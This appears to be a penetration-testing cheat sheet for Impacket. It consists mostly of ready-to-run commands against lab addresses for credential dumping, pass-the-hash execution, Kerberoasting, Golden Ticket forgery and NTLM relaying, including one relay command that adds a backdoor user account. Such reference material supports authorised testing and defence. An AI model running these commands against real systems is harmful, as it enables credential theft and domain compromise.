# 🧰 Impacket Complete Reference Manual

Impacket is a collection of Python classes for working with network protocols, providing the backbone for Active Directory penetration testing and credential attacks.

---

### Credential Dumping Tools

#### 1. `secretsdump.py`
Performs remote credential harvesting from SAM, LSA secrets, and Active Directory (`NTDS.dit`) via DCSync or VSS volume shadow copies.

```bash
# Dump Domain credentials via DCSync (requires replication privileges)
secretsdump.py CORP.LOCAL/itadmin:'AdminMaster2025!'@192.168.56.10 -just-dc-user Administrator

# Dump single user history (shows previous passwords)
secretsdump.py CORP.LOCAL/itadmin:'AdminMaster2025!'@192.168.56.10 -just-dc-user jdoe -history

# Dump full domain NTDS.dit offline from target
secretsdump.py CORP.LOCAL/Administrator@192.168.56.10 -ntds /root/ntds.dit -system /root/SYSTEM.bak LOCAL

# Extract local workstation SAM and LSA secrets via SMB
secretsdump.py -hashes :7c4a8d09ca3762af61e59520943dc264 Administrator@192.168.56.20
```

---

### Remote Execution Tools

#### 1. `wmiexec.py`
Executes commands via Windows Management Instrumentation (WMI) and DCOM over port 135. Does not install a Windows service, leaving minimal disk artifacts.

```bash
# Password authentication
wmiexec.py CORP.LOCAL/Administrator:'Password123'@192.168.56.20

# Pass-the-Hash authentication
wmiexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:afff6209e51e70e9f80... Administrator@192.168.56.20

# Kerberos authentication (requires KRB5CCNAME)
wmiexec.py -k -no-pass CORP.LOCAL/Administrator@CORP-WS01.corp.local
```

#### 2. `psexec.py`
Installs a temporary remote Windows Service over SMB (port 445) and creates a named pipe for standard input/output. Spawns an interactive shell running as `NT AUTHORITY\SYSTEM`.

```bash
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:afff6209e51e70e9f80... Administrator@192.168.56.20
```

#### 3. `smbexec.py`
Lightweight remote execution that uses the native Windows service controller (`sc.exe`) over SMB without uploading a custom binary to disk.

```bash
smbexec.py CORP.LOCAL/Administrator:'Password123'@192.168.56.20
```

#### 4. `atexec.py`
Executes a single command remotely via the Windows Task Scheduler (Task Scheduler Service via RPC).

```bash
atexec.py CORP.LOCAL/Administrator:'Password123'@192.168.56.20 "whoami /priv"
```

---

### Kerberos & Ticket Manipulation Tools

#### 1. `GetUserSPNs.py` (Kerberoasting)
```bash
GetUserSPNs.py CORP.LOCAL/jdoe:'Welcome2025!' -dc-ip 192.168.56.10 -request -outputfile kerberoast_hashes.txt
```

#### 2. `GetNPUsers.py` (AS-REP Roasting)
```bash
GetNPUsers.py CORP.LOCAL/jdoe:'Welcome2025!' -dc-ip 192.168.56.10 -request -outputfile asrep_hashes.txt
```

#### 3. `ticketer.py` (Golden & Silver Tickets)
```bash
# Forge Golden Ticket using domain SID and KRBTGT NTLM hash
ticketer.py -nthash 82c8159b9ef3e72cfda6e9759adfb110 \
  -domain-sid S-1-5-21-139045895-312948194-291847192 \
  -domain corp.local -user-id 500 Administrator

# Set ticket in environment and use
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass -dc-ip 192.168.56.10 CORP.LOCAL/Administrator@corp-dc01.corp.local
```

---

### Relaying Tools

#### 1. `ntlmrelayx.py`
Intercepts and relays captured NTLM authentication to target systems supporting SMB, LDAP, LDAPS, HTTP, or MSSQL.

```bash
# Relay to SMB target with interactive command execution
ntlmrelayx.py -tf targets.txt -smb2support -c "net user hacker Password123! /add"

# Relay to LDAP to create a new Domain Admin or add rights
ntlmrelayx.py -t ldap://192.168.56.10 -smb2support --escalate-user jdoe

# Relay to AD CS Web Enrollment for machine certificate generation
ntlmrelayx.py -t http://192.168.56.15/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
